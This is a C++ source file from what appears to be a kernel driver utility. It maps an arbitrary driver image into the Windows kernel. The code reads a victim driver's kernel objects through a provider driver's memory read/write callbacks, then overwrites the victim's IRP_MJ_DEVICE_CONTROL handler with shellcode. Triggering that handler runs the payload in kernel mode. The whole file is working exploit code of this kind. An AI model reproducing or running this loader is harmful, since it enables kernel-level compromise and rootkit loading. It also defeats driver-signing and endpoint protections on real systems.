/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       DRVMAP.CPP
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* KDUShowPayloadResult
*
* Purpose:
*
* Query and display shellcode result.
*
*/
VOID KDUShowPayloadResult(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE SectionHandle
)
{
    NTSTATUS ntStatus;
    ULONG payloadSize = 0;
    SIZE_T viewSize;

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pvPayloadHead.Ref = NULL;

    ScSizeOf(Context->ShellVersion, &payloadSize);
    viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);

    ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &pvPayloadHead.Ref,
        0,
        PAGE_SIZE,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READWRITE);

    if (NT_SUCCESS(ntStatus)) {

        switch (Context->ShellVersion) {

        case KDU_SHELLCODE_V2:
            
            supPrintfEvent(kduEventInformation, 
                "[~] Shellcode result, system worker: 0x%p\r\n", 
                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
            
            break;

        case KDU_SHELLCODE_V3:
        case KDU_SHELLCODE_V1:
        default:
            
            supPrintfEvent(kduEventInformation, 
                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
            
            break;
        }

        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
    }
    else {
        
        supPrintfEvent(kduEventError, 
            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);

    }
}

/*
* KDUStorePayloadInSection
*
* Purpose:
*
* Load input file as image, resolve import and store result in shared section.
*
*/
BOOL KDUStorePayloadInSection(
    _In_ PKDU_CONTEXT Context,
    _Out_ PHANDLE SectionHandle,
    _Out_ PSIZE_T ViewSize,
    _In_ PVOID ImageBase,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    BOOL bSuccess = FALSE;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    HANDLE sectionHandle = NULL;
    PACL defaultAcl = NULL;
    PVOID pvSharedSection = NULL, dataPtr = NULL;

    PIMAGE_NT_HEADERS ntHeader;

    UNICODE_STRING uStr;
    OBJECT_ATTRIBUTES objAttr;
    PSECURITY_DESCRIPTOR sectionSD = NULL;

    UUID secUuid;
    WCHAR szName[100];

    union {
        union {
            PAYLOAD_HEADER_V1 *v1;
            PAYLOAD_HEADER_V2 *v2;
            PAYLOAD_HEADER_V3 *v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;
    *ViewSize = 0;

    do {

        SIZE_T cbPayloadHead;

        switch (Context->ShellVersion) {
        case KDU_SHELLCODE_V3:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V1:
        default:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
            break;
        }

        //
        // Allocate space for header per version.
        //
        pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
        if (pvPayloadHead.Ref == NULL) {
            
            supPrintfEvent(kduEventError, 
                "[!] Error, payload header not allocated\r\n");
            
            break;
        }

        //
        // Create SD for section.
        //
        ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Error, shared section SD not allocated, NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        //
        // Create UUID.
        //
        if (RPC_S_OK != UuidCreate(&secUuid)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Could not allocate shared section UUID, GetLastError %lu\r\n", GetLastError());
            
            break;
        }

        ntHeader = RtlImageNtHeader(ImageBase);

        //
        // Resolve import (ntoskrnl only).
        //
        ULONG isz = ntHeader->OptionalHeader.SizeOfImage;

        dataPtr = supHeapAlloc(isz);
        if (dataPtr) {
            RtlCopyMemory(dataPtr, ImageBase, isz);

            printf_s("[+] Resolving kernel import for input driver\r\n");
            supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);

        }
        else {
            
            supPrintfEvent(kduEventError, 
                "[!] Could not allocate memory for image\r\n");
            
            break;
        }

        //
        // Create shared section.
        //
        RtlSecureZeroMemory(szName, sizeof(szName));
        StringCchPrintf(szName, RTL_NUMBER_OF(szName), 
            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            secUuid.Data1, secUuid.Data2, secUuid.Data3,
            secUuid.Data4[0],
            secUuid.Data4[1],
            secUuid.Data4[2],
            secUuid.Data4[3],
            secUuid.Data4[4],
            secUuid.Data4[5],
            secUuid.Data4[6],
            secUuid.Data4[7]);

        RtlInitUnicodeString(&uStr, szName);
        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);

        LARGE_INTEGER liSectionSize;
        SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);

        liSectionSize.QuadPart = viewSize;
        *ViewSize = viewSize;

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            &objAttr,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Error, cannot create shared section, NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &viewSize,
            ViewUnmap,
            MEM_TOP_DOWN,
            PAGE_READWRITE);

        if (NT_SUCCESS(ntStatus)) {

            printf_s("[+] Resolving payload import\r\n");

            if (ScResolveImportForPayload(
                Context->ShellVersion,
                pvPayloadHead.Ref,
                KernelImage,
                KernelBase))
            {
                EncodeBuffer(dataPtr, isz, Context->EncryptKey);

                switch (Context->ShellVersion) {
                case KDU_SHELLCODE_V3:
                    pvPayloadHead.Version.v3->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V2:
                    pvPayloadHead.Version.v2->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V1:
                default:
                    pvPayloadHead.Version.v1->ImageSize = isz;
                    break;
                }

                //
                // This field is version independent.
                //
                pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;

                if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {
                    
                    supPrintfEvent(kduEventError, 
                        "[!] Error, cannot store additional data for shellcode\r\n");
                    
                    break;
                }

                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);

                NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
                *SectionHandle = sectionHandle;
                bSuccess = TRUE;
            }
            else {

                supPrintfEvent(kduEventError, 
                    "[!] Error, resolving additional import failed\r\n");

            }

        }
        else {

            supPrintfEvent(kduEventError, 
                "[!] Error, shared section not mapped, NTSTATUS (0x%lX)\r\n", ntStatus);

        }

    } while (FALSE);

    SetLastError(RtlNtStatusToDosError(ntStatus));

    if (dataPtr) supHeapFree(dataPtr);
    if (sectionSD) supHeapFree(sectionSD);
    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
    if (defaultAcl) supHeapFree(defaultAcl);

    if (bSuccess == FALSE) {

        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
        if (sectionHandle) NtClose(sectionHandle);

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

/*
* KDUSetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
PVOID KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PHANDLE SectionHandle)
{
    NTSTATUS ntStatus;
    ULONG procSize = 0;
    SIZE_T viewSize = 0;
    HANDLE sectionHandle = NULL;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    PVOID pvShellCode = NULL;

    WCHAR szNtOs[MAX_PATH * 2];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0) {
            
            supPrintfEvent(kduEventError, 
                "[!] Cannot query ntoskrnl loaded base, abort\r\n");
            
            break;
        }

        printf_s("[+] Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
        // Preload ntoskrnl.exe
        //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
            
            supPrintfEvent(kduEventError, 
                "[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);
            
            break;
        }

        printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);

        //
        // Prepare and store payload for later shellcode use.
        //
        if (!KDUStorePayloadInSection(Context,
            &sectionHandle,
            &viewSize,
            ImageBase,
            KernelImage,
            KernelBase))
        {
            
            supPrintfEvent(kduEventError, 
                "[!] Error while mapping payload, abort\r\n");
            
            break;
        }

        *SectionHandle = sectionHandle;

        //
        // Allocate shellcode.
        //
        pvShellCode = ScAllocate(Context->ShellVersion,
            sectionHandle,
            viewSize,
            KernelImage,
            KernelBase,
            Context->MemoryTag,
            &procSize);

        if (pvShellCode == NULL)
            break;

        if (procSize == 0) {
            
            supPrintfEvent(kduEventError, 
                "[!] Unexpected shellcode procedure size, abort\r\n");
            
            ScFree(pvShellCode);
            pvShellCode = NULL;
            break;
        }

        printf_s("[+] Bootstrap code size = 0x%lX\r\n", procSize);

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return pvShellCode;
}

/*
* KDUCheckMemoryLayout
*
* Purpose:
*
* Check if shellcode can be placed within the same/next physical page(s).
*
*/
BOOL KDUCheckMemoryLayout(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR TargetAddress
)
{
    ULONG dataSize;
    ULONG_PTR memPage, physAddrStart, physAddrEnd;

    KDU_PROVIDER* prov = Context->Provider;

    //
    // If provider does not support translation return TRUE.
    //
    if ((PVOID)prov->Callbacks.VirtualToPhysical == NULL)
        return TRUE;

    dataSize = ScSizeOf(Context->ShellVersion, NULL);

    memPage = (TargetAddress & 0xfffffffffffff000ull);

    if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        memPage,
        &physAddrStart))
    {
        memPage = (TargetAddress + dataSize) & 0xfffffffffffff000ull;

        if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
            memPage,
            &physAddrEnd))
        {
            ULONG_PTR diffAddr = physAddrEnd - physAddrStart;

            if (diffAddr > PAGE_SIZE)
                return FALSE;
            else
                return TRUE;
        }

    }
    return FALSE;
}

/*
* KDUMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR objectAddress, targetAddress = 0;
    FILE_OBJECT fileObject;
    DEVICE_OBJECT deviceObject;
    DRIVER_OBJECT driverObject;

    PVOID pvShellCode;

    KDU_PROVIDER* prov;
    KDU_VICTIM_PROVIDER* victimProv;

    ULONG retryCount = 1, maxRetry = 3;

    HANDLE victimDeviceHandle = NULL;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    prov = Context->Provider;
    victimProv = Context->Victim;

Reload:

    if (victimProv->SupportReload == FALSE) {
        printf_s("[+] Victim does not supports reload, max retry count set to 1\r\n");
        maxRetry = 1;
    }

    printf_s("[+] Victim \"%ws\" %lu acquire attempt of %lu (max)\r\n", victimProv->Name, retryCount, maxRetry);

    //
    // If this is reload, release victim.
    //
    if (victimDeviceHandle) {
        VpRelease(victimProv, &victimDeviceHandle);
    }

    if (VpCreate(victimProv,
        Context->ModuleBase,
        &victimDeviceHandle))
    {
        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
    }
    else {

        supPrintfEvent(kduEventError, 
            "[!] Could not accept victim target, GetLastError %lu\r\n", GetLastError());

    }

    if (supQueryObjectFromHandle(victimDeviceHandle, &objectAddress)) {

        do {

            RtlSecureZeroMemory(&fileObject, sizeof(fileObject));

            printf_s("[+] Reading FILE_OBJECT at 0x%llX\r\n", objectAddress);

            if (!KDUReadKernelVM(Context,
                objectAddress,
                &fileObject,
                sizeof(FILE_OBJECT)))
            {
                
                supPrintfEvent(kduEventError, 
                    "[!] Could not read FILE_OBJECT at 0x%llX\r\n", objectAddress);
                
                break;
            }

            printf_s("[+] Reading DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);

            RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));

            if (!KDUReadKernelVM(Context,
                (ULONG_PTR)fileObject.DeviceObject,
                &deviceObject,
                sizeof(DEVICE_OBJECT)))
            {
                
                supPrintfEvent(kduEventError, 
                    "[!] Could not read DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
                
                break;
            }

            printf_s("[+] Reading DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);

            RtlSecureZeroMemory(&driverObject, sizeof(driverObject));

            if (!KDUReadKernelVM(Context,
                (ULONG_PTR)deviceObject.DriverObject,
                &driverObject,
                sizeof(DRIVER_OBJECT)))
            {
                
                supPrintfEvent(kduEventError, 
                    "[!] Could not read DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
                
                break;
            }

            //
            // Victim handle no longer needed, can be closed.
            //
            NtClose(victimDeviceHandle);
            victimDeviceHandle = NULL;

            targetAddress = (ULONG_PTR)driverObject.MajorFunction[IRP_MJ_DEVICE_CONTROL];

            if (!KDUCheckMemoryLayout(Context, targetAddress)) {

                supPrintfEvent(kduEventError, 
                    "[!] Physical address is not within same/next page, reload victim driver\r\n");
                
                retryCount += 1;
                if (retryCount > maxRetry) {
                    
                    supPrintfEvent(kduEventError, 
                        "[!] Too many attempts, abort\r\n");
                    
                    break;
                }
                goto Reload;

            }

            printf_s("[+] Victim IRP_MJ_DEVICE_CONTROL 0x%llX\r\n", targetAddress);
            printf_s("[+] Victim DriverUnload 0x%p\r\n", driverObject.DriverUnload);

            bSuccess = TRUE;

        } while (FALSE);

    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    if (bSuccess) {

        HANDLE sectionHandle = NULL;

        pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);

        if (pvShellCode) {

            HANDLE readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
            if (readyEventHandle) {

                //
                // Write shellcode to driver.
                //
                if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
                    targetAddress,
                    pvShellCode, 
                    ScSizeOf(Context->ShellVersion, NULL)))
                {
                    
                    supPrintfEvent(kduEventError, 
                        "[!] Error writing shellcode to the target driver, abort\r\n");
                    
                    bSuccess = FALSE;
                }
                else {

                    printf_s("[+] Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");

                    //
                    // Run shellcode.
                    //
                    printf_s("[+] Run shellcode\r\n");
                    VpExecutePayload(victimProv, &victimDeviceHandle);

                    //
                    // Wait for the shellcode to trigger the event
                    //
                    if (WaitForSingleObject(readyEventHandle, 2000) != WAIT_OBJECT_0) {
                        
                        supPrintfEvent(kduEventError, 
                            "[!] Shellcode did not trigger the event within two seconds.\r\n");
                        
                        bSuccess = FALSE;
                    }
                    else
                    {
                        KDUShowPayloadResult(Context, sectionHandle);
                    }
                }

                CloseHandle(readyEventHandle);

            } //readyEventHandle
            else {
                
                supPrintfEvent(kduEventError, 
                    "[!] Error building the ready event handle, abort\r\n");
                
                bSuccess = FALSE;
            }

            if (sectionHandle) {
                NtClose(sectionHandle);
            }

        } //pvShellCode

        else {
            
            supPrintfEvent(kduEventError, 
                "[!] Error while building shellcode, abort\r\n");
            
            bSuccess = FALSE;
        }
    
    } //bSuccess
    else {
        
        supPrintfEvent(kduEventError, 
            "[!] Error preloading victim driver, abort\r\n");
        
        bSuccess = FALSE;
    }

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}
